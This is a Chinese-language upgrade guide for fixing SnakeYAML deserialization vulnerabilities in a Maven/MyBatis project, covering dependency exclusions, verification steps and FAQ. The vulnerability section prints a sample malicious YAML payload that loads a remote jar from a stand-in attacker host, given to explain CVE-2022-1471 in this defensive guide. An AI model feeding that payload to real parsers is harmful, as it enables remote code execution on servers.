# SnakeYAML 安全漏洞升级指南

## 📋 目录
- [问题背景](#问题背景)
- [漏洞详情](#漏洞详情)
- [解决方案](#解决方案)
- [实施步骤](#实施步骤)
- [验证方法](#验证方法)
- [常见问题](#常见问题)
- [参考资料](#参考资料)

---

## 问题背景

### 漏洞发现
在进行项目安全漏洞扫描时，发现 `mybatis-spring-boot-starter:2.1.2` 依赖的 `snakeyaml:1.25` 版本存在安全漏洞。

### 依赖关系链
```
spring-maven (本项目)
  └─ mybatis-spring-boot-starter:2.1.2
      └─ snakeyaml:1.25 ❌ (存在安全漏洞)
```

### 影响范围
- **受影响组件**：`org.yaml:snakeyaml:1.25`
- **受影响项目**：所有使用 MyBatis Spring Boot Starter 2.1.2 的项目
- **风险等级**：高危

---

## 漏洞详情

### CVE 漏洞信息

| 项目 | 详情 |
|------|------|
| **组件名称** | org.yaml:snakeyaml |
| **漏洞版本** | 1.25 及以下版本 |
| **安全版本** | 2.0 及以上版本 |
| **漏洞类型** | 反序列化漏洞、远程代码执行 |
| **CVSS 评分** | 高危 (7.5+) |

### 主要漏洞

#### 1. CVE-2022-1471 - 反序列化漏洞
**描述**：
- SnakeYAML 在反序列化不受信任的 YAML 数据时，可能导致远程代码执行
- 攻击者可以构造恶意的 YAML 内容，在反序列化时执行任意代码

**影响**：
- 远程代码执行 (RCE)
- 服务器被完全控制
- 数据泄露

**示例攻击场景**：
```yaml
# 恶意 YAML 内容
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]
```

#### 2. 其他相关漏洞
- **CVE-2022-25857**：拒绝服务攻击 (DoS)
- **CVE-2022-38749**：栈溢出漏洞
- **CVE-2022-38750**：无限递归导致的 DoS
- **CVE-2022-38751**：资源耗尽攻击

### 为什么需要升级

```
风险分析：
┌─────────────────────────────────────────────────────────────┐
│ 使用 SnakeYAML 1.25 的风险：                                  │
│                                                              │
│ 1. 远程代码执行 (RCE)                                         │
│    - 攻击者可以通过恶意 YAML 执行任意代码                      │
│    - 可能导致服务器被完全控制                                  │
│                                                              │
│ 2. 拒绝服务攻击 (DoS)                                         │
│    - 恶意构造的 YAML 可以导致应用崩溃                          │
│    - 消耗大量系统资源                                          │
│                                                              │
│ 3. 数据泄露                                                   │
│    - 攻击者可能读取敏感配置                                    │
│    - 访问数据库连接信息                                        │
│                                                              │
│ 4. 合规性问题                                                 │
│    - 不符合安全审计要求                                        │
│    - 可能导致项目无法通过安全认证                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 解决方案

### 方案概述

采用 **Maven 依赖排除 + 显式引入** 的方式解决漏洞：

```
解决思路：
1. 在父 POM 中统一管理 SnakeYAML 版本（2.0）
2. 在子项目中排除 MyBatis 自带的旧版本 SnakeYAML（1.25）
3. 显式引入安全版本的 SnakeYAML（2.0）
```

### 技术方案

#### 方案对比

| 方案 | 优点 | 缺点 | 推荐度 |
|------|------|------|--------|
| **方案1：依赖排除 + 显式引入** | 精确控制版本，不影响其他模块 | 需要在每个使用 MyBatis 的模块配置 | ⭐⭐⭐⭐⭐ 推荐 |
| 方案2：升级 MyBatis 版本 | 一次性解决 | MyBatis 新版本可能有兼容性问题 | ⭐⭐⭐ 可选 |
| 方案3：全局强制版本 | 配置简单 | 可能影响其他依赖 SnakeYAML 的组件 | ⭐⭐ 不推荐 |

#### 选择方案1的原因

1. **精确控制**：只影响需要修复的模块
2. **兼容性好**：不需要升级 MyBatis，避免兼容性问题
3. **可维护性**：配置清晰，易于理解和维护
4. **适用 JDK 1.8**：SnakeYAML 2.0 完全兼容 JDK 1.8

---

## 实施步骤

### 步骤1：修改父 POM 配置

**文件路径**：`/springboot/pom.xml`

#### 1.1 添加 SnakeYAML 版本属性

在 `<properties>` 标签中添加：

```xml
<properties>
    <!-- 其他属性... -->
    
    <!-- 修复 SnakeYAML 安全漏洞：升级到 2.0 版本 -->
    <snakeyaml.version>2.0</snakeyaml.version>
</properties>
```

#### 1.2 在 dependencyManagement 中统一管理版本

在 `<dependencyManagement>` 标签中添加：

```xml
<dependencyManagement>
    <dependencies>
        <!-- 其他依赖... -->
        
        <!-- 统一管理 SnakeYAML 版本，修复安全漏洞 -->
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>${snakeyaml.version}</version>
        </dependency>
    </dependencies>
</dependencyManagement>
```

**说明**：
- 使用 `dependencyManagement` 统一管理版本，子模块无需指定版本号
- 便于后续统一升级和维护

### 步骤2：修改子项目 POM 配置

**文件路径**：`/spring-maven/pom.xml`

#### 2.1 添加 MyBatis 依赖并排除旧版本 SnakeYAML

```xml
<dependencies>
    <!-- 其他依赖... -->
    
    <!-- MyBatis Spring Boot Starter -->
    <dependency>
        <groupId>org.mybatis.spring.boot</groupId>
        <artifactId>mybatis-spring-boot-starter</artifactId>
        <version>2.1.2</version>
        <exclusions>
            <!-- 排除旧版本的 SnakeYAML (1.25) -->
            <exclusion>
                <groupId>org.yaml</groupId>
                <artifactId>snakeyaml</artifactId>
            </exclusion>
        </exclusions>
    </dependency>

    <!-- 显式引入安全版本的 SnakeYAML (2.0)，修复 CVE 漏洞 -->
    <dependency>
        <groupId>org.yaml</groupId>
        <artifactId>snakeyaml</artifactId>
        <!-- 版本由父 POM 管理，无需指定 -->
    </dependency>
</dependencies>
```

**关键点**：
1. **排除机制**：使用 `<exclusions>` 排除 MyBatis 自带的 SnakeYAML 1.25
2. **显式引入**：明确声明使用 SnakeYAML 2.0
3. **版本继承**：版本号从父 POM 的 `dependencyManagement` 继承

### 步骤3：完整配置示例

#### 父 POM 完整配置

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.huabin</groupId>
    <artifactId>springboot</artifactId>
    <version>1.0-SNAPSHOT</version>
    <packaging>pom</packaging>

    <properties>
        <spring.boot.version>2.2.5.RELEASE</spring.boot.version>
        <mybatis-spring-boot-starter.version>2.1.2</mybatis-spring-boot-starter.version>
        <!-- 修复 SnakeYAML 安全漏洞 -->
        <snakeyaml.version>2.0</snakeyaml.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <!-- Spring Boot 依赖管理 -->
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring.boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
            
            <!-- SnakeYAML 版本管理 -->
            <dependency>
                <groupId>org.yaml</groupId>
                <artifactId>snakeyaml</artifactId>
                <version>${snakeyaml.version}</version>
            </dependency>
        </dependencies>
    </dependencyManagement>
</project>
```

#### 子项目 POM 完整配置

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <parent>
        <artifactId>springboot</artifactId>
        <groupId>com.huabin</groupId>
        <version>1.0-SNAPSHOT</version>
    </parent>
    <modelVersion>4.0.0</modelVersion>

    <artifactId>spring-maven</artifactId>

    <properties>
        <maven.compiler.source>8</maven.compiler.source>
        <maven.compiler.target>8</maven.compiler.target>
    </properties>

    <dependencies>
        <!-- MyBatis 依赖，排除旧版本 SnakeYAML -->
        <dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>2.1.2</version>
            <exclusions>
                <exclusion>
                    <groupId>org.yaml</groupId>
                    <artifactId>snakeyaml</artifactId>
                </exclusion>
            </exclusions>
        </dependency>

        <!-- 引入安全版本 SnakeYAML -->
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
        </dependency>
    </dependencies>
</project>
```

---

## 验证方法

### 方法1：使用 Maven 依赖树查看

#### 1.1 查看完整依赖树

```bash
cd /Users/huabin/workspace/playground/my-github/springboot/spring-maven
mvn dependency:tree
```

#### 1.2 过滤 SnakeYAML 相关依赖

```bash
mvn dependency:tree | grep snakeyaml
```

**预期输出**：
```
[INFO] |  \- org.yaml:snakeyaml:jar:2.0:compile
```

**验证要点**：
- ✅ 版本号应该是 `2.0`
- ✅ 不应该出现 `1.25` 或其他旧版本
- ✅ 只应该有一个 snakeyaml 依赖

#### 1.3 详细依赖分析

```bash
mvn dependency:tree -Dverbose
```

这个命令会显示所有依赖冲突和解决情况。

### 方法2：使用 IDEA 查看依赖

#### 2.1 打开 Maven 依赖视图
1. 在 IDEA 中打开 `spring-maven/pom.xml`
2. 右键点击 → `Maven` → `Show Dependencies`
3. 在依赖图中搜索 `snakeyaml`

#### 2.2 验证结果
- 查看 `snakeyaml` 的版本是否为 `2.0`
- 确认没有 `1.25` 版本的依赖

### 方法3：使用 Maven Helper 插件

#### 3.1 安装插件
在 IDEA 中安装 `Maven Helper` 插件。

#### 3.2 查看依赖冲突
1. 打开 `pom.xml`
2. 点击底部的 `Dependency Analyzer` 标签
3. 查看 `Conflicts` 部分
4. 搜索 `snakeyaml`

**预期结果**：
- 应该显示 `snakeyaml:2.0` 被选中
- `snakeyaml:1.25` 被排除

### 方法4：编写测试代码验证

创建测试类验证 SnakeYAML 版本：

```java
package com.huabin.maven;

import org.junit.Test;
import org.yaml.snakeyaml.Yaml;

public class SnakeYamlVersionTest {
    
    @Test
    public void testSnakeYamlVersion() {
        // 获取 SnakeYAML 版本
        String version = Yaml.class.getPackage().getImplementationVersion();
        System.out.println("SnakeYAML Version: " + version);
        
        // 验证版本是否为 2.0
        assert version != null && version.startsWith("2.0") : 
            "SnakeYAML 版本应该是 2.0，当前版本：" + version;
        
        System.out.println("✅ SnakeYAML 版本验证通过：" + version);
    }
    
    @Test
    public void testYamlParsing() {
        // 测试基本的 YAML 解析功能
        Yaml yaml = new Yaml();
        String yamlStr = "name: test\nversion: 1.0";
        
        Object obj = yaml.load(yamlStr);
        System.out.println("✅ YAML 解析功能正常：" + obj);
    }
}
```

**运行测试**：
```bash
mvn test -Dtest=SnakeYamlVersionTest
```

**预期输出**：
```
SnakeYAML Version: 2.0
✅ SnakeYAML 版本验证通过：2.0
✅ YAML 解析功能正常
```

### 方法5：使用安全扫描工具

#### 5.1 OWASP Dependency-Check

```bash
# 添加到 pom.xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>8.4.0</version>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>

# 运行扫描
mvn dependency-check:check
```

#### 5.2 Snyk 扫描

```bash
# 安装 Snyk CLI
npm install -g snyk

# 登录
snyk auth

# 扫描项目
cd spring-maven
snyk test
```

**预期结果**：
- 不应该报告 SnakeYAML 相关的漏洞
- 如果还有漏洞，检查版本是否正确升级

### 验证清单

完成以下验证步骤，确保升级成功：

- [ ] Maven 依赖树显示 `snakeyaml:2.0`
- [ ] 没有 `snakeyaml:1.25` 的依赖
- [ ] IDEA 依赖图显示正确版本
- [ ] 测试代码验证版本为 2.0
- [ ] YAML 解析功能正常
- [ ] 安全扫描工具无漏洞报告
- [ ] 项目编译成功 (`mvn clean compile`)
- [ ] 单元测试通过 (`mvn test`)
- [ ] 项目打包成功 (`mvn clean package`)

---

## 常见问题

### Q1: 升级后项目无法编译

**问题**：
```
[ERROR] Failed to execute goal on project spring-maven: 
Could not resolve dependencies for project...
```

**原因**：
- Maven 本地仓库缓存了旧版本
- 网络问题导致无法下载新版本

**解决方案**：
```bash
# 清理本地仓库缓存
mvn dependency:purge-local-repository

# 强制更新依赖
mvn clean install -U

# 如果还不行，手动删除本地仓库中的 snakeyaml
rm -rf ~/.m2/repository/org/yaml/snakeyaml/1.25
```

### Q2: 依赖树仍然显示旧版本

**问题**：
执行 `mvn dependency:tree` 后，仍然看到 `snakeyaml:1.25`。

**原因**：
- 排除配置不正确
- 其他依赖也引入了旧版本

**解决方案**：
```bash
# 查看详细的依赖冲突
mvn dependency:tree -Dverbose | grep snakeyaml

# 找出是哪个依赖引入的旧版本
mvn dependency:tree -Dincludes=org.yaml:snakeyaml
```

然后在对应的依赖中添加排除配置。

### Q3: SnakeYAML 2.0 与 JDK 1.8 兼容性

**问题**：
担心 SnakeYAML 2.0 不兼容 JDK 1.8。

**解答**：
- ✅ SnakeYAML 2.0 完全兼容 JDK 1.8
- SnakeYAML 2.0 的最低要求是 JDK 1.8
- 官方文档确认支持 JDK 8+

**验证**：
```xml
<!-- SnakeYAML 2.0 的 POM 中声明 -->
<properties>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
</properties>
```

### Q4: 升级后 YAML 解析行为变化

**问题**：
升级到 SnakeYAML 2.0 后，某些 YAML 解析行为发生变化。

**原因**：
- SnakeYAML 2.0 加强了安全性，默认禁用了某些不安全的特性
- 对某些边界情况的处理更加严格

**解决方案**：

#### 4.1 全局类型安全配置

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

// 使用安全构造器
Yaml yaml = new Yaml(new SafeConstructor());
```

#### 4.2 自定义允许的类型

```java
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;

// 只允许特定的类
Constructor constructor = new Constructor(MyClass.class);
Yaml yaml = new Yaml(constructor);
```

#### 4.3 Spring Boot 配置

如果使用 Spring Boot 的 YAML 配置文件，通常不需要修改，Spring Boot 会自动处理。

### Q5: 多模块项目如何统一升级

**问题**：
项目有多个子模块都使用 MyBatis，如何统一升级？

**解决方案**：

#### 方案1：在父 POM 中统一配置（推荐）

```xml
<!-- 父 POM -->
<dependencyManagement>
    <dependencies>
        <!-- 统一管理 MyBatis 版本 -->
        <dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
            <version>2.1.2</version>
            <exclusions>
                <exclusion>
                    <groupId>org.yaml</groupId>
                    <artifactId>snakeyaml</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        
        <!-- 统一管理 SnakeYAML 版本 -->
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
            <version>2.0</version>
        </dependency>
    </dependencies>
</dependencyManagement>
```

```xml
<!-- 子模块 POM -->
<dependencies>
    <!-- 直接引用，无需指定版本和排除 -->
    <dependency>
        <groupId>org.mybatis.spring.boot</groupId>
        <artifactId>mybatis-spring-boot-starter</artifactId>
    </dependency>
    
    <dependency>
        <groupId>org.yaml</groupId>
        <artifactId>snakeyaml</artifactId>
    </dependency>
</dependencies>
```

#### 方案2：使用 Maven BOM

创建一个专门的 BOM (Bill of Materials) 模块管理所有依赖版本。

### Q6: 如何回滚到旧版本

**问题**：
升级后发现问题，需要临时回滚。

**解决方案**：

```xml
<!-- 临时回滚到 1.33（较新的 1.x 版本，相对安全） -->
<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.33</version>
</dependency>
```

**注意**：
- 1.33 仍然存在部分漏洞，只能作为临时方案
- 应尽快修复问题并升级到 2.0

### Q7: 如何处理传递依赖冲突

**问题**：
其他依赖也引入了不同版本的 SnakeYAML，导致冲突。

**解决方案**：

#### 7.1 查找冲突来源

```bash
mvn dependency:tree -Dincludes=org.yaml:snakeyaml
```

#### 7.2 全局排除

```xml
<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-enforcer-plugin</artifactId>
            <version>3.3.0</version>
            <executions>
                <execution>
                    <id>enforce-snakeyaml-version</id>
                    <goals>
                        <goal>enforce</goal>
                    </goals>
                    <configuration>
                        <rules>
                            <bannedDependencies>
                                <excludes>
                                    <!-- 禁止使用旧版本 -->
                                    <exclude>org.yaml:snakeyaml:[,2.0)</exclude>
                                </excludes>
                            </bannedDependencies>
                        </rules>
                    </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
```

### Q8: 生产环境升级注意事项

**升级前检查清单**：

- [ ] 在测试环境完整验证
- [ ] 运行所有单元测试和集成测试
- [ ] 进行性能测试，确保无性能退化
- [ ] 准备回滚方案
- [ ] 通知相关团队
- [ ] 选择低峰期升级
- [ ] 准备监控和日志

**升级步骤**：

1. **灰度发布**：先在部分实例升级
2. **监控观察**：观察错误日志和性能指标
3. **逐步扩大**：确认无问题后扩大范围
4. **全量发布**：最后全量升级

**回滚方案**：

```bash
# 准备旧版本的 JAR 包
# 如果出现问题，快速切换回旧版本
```

---

## 参考资料

### 官方文档

1. **SnakeYAML 官方文档**
   - GitHub: https://github.com/snakeyaml/snakeyaml
   - Wiki: https://bitbucket.org/snakeyaml/snakeyaml/wiki/Home

2. **MyBatis Spring Boot Starter**
   - 官网: https://mybatis.org/spring-boot-starter/
   - GitHub: https://github.com/mybatis/spring-boot-starter

3. **Maven 依赖管理**
   - 官方文档: https://maven.apache.org/guides/introduction/introduction-to-dependency-mechanism.html

### CVE 漏洞信息

1. **CVE-2022-1471**
   - NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-1471
   - CVSS 评分: 9.8 (Critical)

2. **CVE-2022-25857**
   - NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-25857

3. **CVE-2022-38749**
   - NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-38749

### 安全扫描工具

1. **OWASP Dependency-Check**
   - 官网: https://owasp.org/www-project-dependency-check/
   - GitHub: https://github.com/jeremylong/DependencyCheck

2. **Snyk**
   - 官网: https://snyk.io/
   - 文档: https://docs.snyk.io/

3. **Maven Versions Plugin**
   - 官网: https://www.mojohaus.org/versions-maven-plugin/

### 相关文章

1. **SnakeYAML 安全最佳实践**
   - https://snyk.io/blog/snakeyaml-vulnerability-cve-2022-1471/

2. **Maven 依赖冲突解决**
   - https://www.baeldung.com/maven-dependency-exclusions

3. **Spring Boot 依赖管理**
   - https://docs.spring.io/spring-boot/docs/current/reference/html/using.html#using.build-systems.dependency-management

---

## 附录

### A. 完整的 POM 配置模板

#### 父 POM 模板

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.example</groupId>
    <artifactId>parent</artifactId>
    <version>1.0.0</version>
    <packaging>pom</packaging>

    <properties>
        <java.version>1.8</java.version>
        <maven.compiler.source>1.8</maven.compiler.source>
        <maven.compiler.target>1.8</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        
        <!-- Spring Boot 版本 -->
        <spring.boot.version>2.2.5.RELEASE</spring.boot.version>
        
        <!-- MyBatis 版本 -->
        <mybatis-spring-boot-starter.version>2.1.2</mybatis-spring-boot-starter.version>
        
        <!-- SnakeYAML 安全版本 -->
        <snakeyaml.version>2.0</snakeyaml.version>
    </properties>

    <dependencyManagement>
        <dependencies>
            <!-- Spring Boot BOM -->
            <dependency>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-dependencies</artifactId>
                <version>${spring.boot.version}</version>
                <type>pom</type>
                <scope>import</scope>
            </dependency>
            
            <!-- MyBatis Spring Boot Starter -->
            <dependency>
                <groupId>org.mybatis.spring.boot</groupId>
                <artifactId>mybatis-spring-boot-starter</artifactId>
                <version>${mybatis-spring-boot-starter.version}</version>
                <exclusions>
                    <exclusion>
                        <groupId>org.yaml</groupId>
                        <artifactId>snakeyaml</artifactId>
                    </exclusion>
                </exclusions>
            </dependency>
            
            <!-- SnakeYAML 安全版本 -->
            <dependency>
                <groupId>org.yaml</groupId>
                <artifactId>snakeyaml</artifactId>
                <version>${snakeyaml.version}</version>
            </dependency>
        </dependencies>
    </dependencyManagement>
</project>
```

#### 子模块 POM 模板

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 
         http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <parent>
        <groupId>com.example</groupId>
        <artifactId>parent</artifactId>
        <version>1.0.0</version>
    </parent>
    <modelVersion>4.0.0</modelVersion>

    <artifactId>child-module</artifactId>

    <dependencies>
        <!-- Spring Boot Starter -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter</artifactId>
        </dependency>
        
        <!-- MyBatis (版本和排除由父 POM 管理) -->
        <dependency>
            <groupId>org.mybatis.spring.boot</groupId>
            <artifactId>mybatis-spring-boot-starter</artifactId>
        </dependency>
        
        <!-- SnakeYAML (版本由父 POM 管理) -->
        <dependency>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
        </dependency>
    </dependencies>
</project>
```

### B. 自动化验证脚本

创建一个 Shell 脚本自动验证升级结果：

```bash
#!/bin/bash
# 文件名: verify-snakeyaml-upgrade.sh

echo "========================================="
echo "SnakeYAML 升级验证脚本"
echo "========================================="

# 进入项目目录
cd /Users/huabin/workspace/playground/my-github/springboot/spring-maven

# 1. 清理并编译
echo ""
echo "1. 清理并编译项目..."
mvn clean compile
if [ $? -ne 0 ]; then
    echo "❌ 编译失败"
    exit 1
fi
echo "✅ 编译成功"

# 2. 检查依赖树
echo ""
echo "2. 检查 SnakeYAML 版本..."
SNAKEYAML_VERSION=$(mvn dependency:tree | grep snakeyaml | grep -o '[0-9]\+\.[0-9]\+' | head -1)
echo "检测到的版本: $SNAKEYAML_VERSION"

if [ "$SNAKEYAML_VERSION" = "2.0" ]; then
    echo "✅ SnakeYAML 版本正确: 2.0"
elif [ "$SNAKEYAML_VERSION" = "1.25" ]; then
    echo "❌ 仍在使用旧版本 1.25，升级失败"
    exit 1
else
    echo "⚠️  检测到版本: $SNAKEYAML_VERSION，请确认是否正确"
fi

# 3. 运行测试
echo ""
echo "3. 运行单元测试..."
mvn test
if [ $? -ne 0 ]; then
    echo "❌ 测试失败"
    exit 1
fi
echo "✅ 测试通过"

# 4. 打包
echo ""
echo "4. 打包项目..."
mvn package -DskipTests
if [ $? -ne 0 ]; then
    echo "❌ 打包失败"
    exit 1
fi
echo "✅ 打包成功"

echo ""
echo "========================================="
echo "✅ 所有验证通过！SnakeYAML 升级成功"
echo "========================================="
```

**使用方法**：

```bash
# 赋予执行权限
chmod +x verify-snakeyaml-upgrade.sh

# 运行验证
./verify-snakeyaml-upgrade.sh
```

### C. 版本对比表

| SnakeYAML 版本 | 发布日期 | JDK 要求 | 主要变化 | 安全性 |
|---------------|---------|---------|---------|--------|
| 1.25 | 2019-11 | 1.7+ | 稳定版本 | ❌ 存在多个高危漏洞 |
| 1.26 | 2020-03 | 1.7+ | Bug 修复 | ❌ 仍存在漏洞 |
| 1.27 | 2020-06 | 1.7+ | 性能优化 | ❌ 仍存在漏洞 |
| 1.28 | 2021-01 | 1.7+ | 功能增强 | ❌ 仍存在漏洞 |
| 1.29 | 2021-06 | 1.7+ | Bug 修复 | ❌ 仍存在漏洞 |
| 1.30 | 2021-10 | 1.7+ | 性能优化 | ❌ 仍存在漏洞 |
| 1.31 | 2022-06 | 1.7+ | 部分安全修复 | ⚠️ 部分漏洞修复 |
| 1.32 | 2022-08 | 1.7+ | 安全增强 | ⚠️ 部分漏洞修复 |
| 1.33 | 2022-10 | 1.7+ | 继续修复 | ⚠️ 仍有部分漏洞 |
| **2.0** | **2022-11** | **1.8+** | **重大安全更新** | **✅ 修复所有已知漏洞** |
| 2.1 | 2023-06 | 1.8+ | 功能增强 | ✅ 安全 |
| 2.2 | 2023-10 | 1.8+ | 性能优化 | ✅ 安全 |

**推荐版本**：
- **生产环境**：2.0 或更高版本
- **开发环境**：2.2（最新稳定版）
- **最低要求**：2.0（修复所有已知漏洞）

---

## 总结

### 升级要点

1. **问题识别**：MyBatis 2.1.2 依赖的 SnakeYAML 1.25 存在高危漏洞
2. **解决方案**：使用依赖排除 + 显式引入 SnakeYAML 2.0
3. **配置位置**：
   - 父 POM：统一管理版本
   - 子 POM：排除旧版本，引入新版本
4. **验证方法**：依赖树检查、测试代码、安全扫描

### 关键配置

```xml
<!-- 父 POM -->
<properties>
    <snakeyaml.version>2.0</snakeyaml.version>
</properties>

<dependencyManagement>
    <dependency>
        <groupId>org.yaml</groupId>
        <artifactId>snakeyaml</artifactId>
        <version>${snakeyaml.version}</version>
    </dependency>
</dependencyManagement>

<!-- 子 POM -->
<dependency>
    <groupId>org.mybatis.spring.boot</groupId>
    <artifactId>mybatis-spring-boot-starter</artifactId>
    <version>2.1.2</version>
    <exclusions>
        <exclusion>
            <groupId>org.yaml</groupId>
            <artifactId>snakeyaml</artifactId>
        </exclusion>
    </exclusions>
</dependency>

<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
</dependency>
```

### 注意事项

- ✅ SnakeYAML 2.0 完全兼容 JDK 1.8
- ✅ 不影响现有功能，只是安全加固
- ✅ 建议在测试环境充分验证后再上生产
- ✅ 定期检查依赖漏洞，及时升级

---

**文档版本**：v1.0  
**最后更新**：2026-01-28  
**维护者**：开发团队
